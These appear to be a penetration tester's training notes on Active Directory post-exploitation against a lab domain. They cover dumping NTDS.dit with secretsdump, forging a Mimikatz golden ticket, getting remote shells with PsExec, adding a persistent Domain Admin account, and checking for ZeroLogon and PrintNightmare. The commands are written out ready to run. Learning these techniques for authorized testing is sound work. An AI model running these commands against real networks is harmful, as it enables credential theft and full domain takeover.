# Overview
## Provide as much value to the client as possible
We got DA? put the blinders on and do it again.
Dump the NTDS.dit and crack passwords.
Enumerate shares for sensitive information.
# Persistence can be important
What happens if our DA access is lost?
Create a DA account that we can access(DELETE IT BY THE END OF THE ENGAGEMENT).
   This should be detected by the client. If it is not, then it is something that should also be reported.
Create a golden ticket.
# Dumping the NTDS.dit
**What is it?**
It's a database used to store AD data. It includes: user information, groups, security descriptors, and password hashes.
Use secretsdump against a Domain Admin account to get the hashes.
```bash
secretsdump.py MARVEL.local/hawkeye:'Password1@'@ip-address -just-dc-ntlm
```
Extract the NT part of the hash.
Parse the information and crack the hashes.
Make a nice table to see: cracked hashes and what user they belong to.
# Golden Ticket Attack
## What is it?
After compromising the `krbtgt` account, we own the domain. It's the kerberos ticket granting ticket.
## What to use it for?
We can request access to any resource or system on the domain.
Golden ticket.
Pass the ticket to access any machine from the CLI.
**Examples**
```batch
dir \\10.0.0.25\C$
PsExec64.exe \\10.0.0.25 cmd.exe
```
## How do we do it?
Mimikatz
```batch
mimikatz.exe
privilege::debug
```
To get the `krbtgt` NTLM hash and the domain `sid` run the command below
```batch
lsadump::lsa /inject /name:krbtgt
```
Generate the golden ticket and enable pass the ticket
```batch
kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-rest-of-sid-here /krbtgt:NTLM-hash-here /id:500 /ptt
```
After getting the golden ticket: Get a shell
```batch
misc::cmd
```
### Requirements for the command and how to get them
We need the `krbtgt` NTLM hash
The domain `sid`
# Additional Active Directory Attacks
Recent Vulnerabilities
Some of these might destroy the domain. Get client approval before attempting them.
## Abusing ZeroLogon
Very dangerous attack to run against an environment. Run on test environment, but not on real engagements.
- [https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
- [SecuraBV ZeroLogon Checker](https://github.com/SecuraBV/CVE-2020-1472)
   - Run the `zerologon_tester.py` script to check if the environment is vulnerable
```bash
python3 zerologon_tester.py DC-name ip-address
```
## PrintNightmare (CVE-2021-1675)
Watch the video
- [cube0x0 RCE](https://github.com/cube0x0/CVE-2021-1675)
- [calebstewart LPE](https://github.com/calebstewart/CVE-2021-1675)
First perform a preliminary check to see if the environment if vulnerable
```bash
rpcdump.py @dc-ip | egrep 'MS-RPRN|MS-PAR'
```
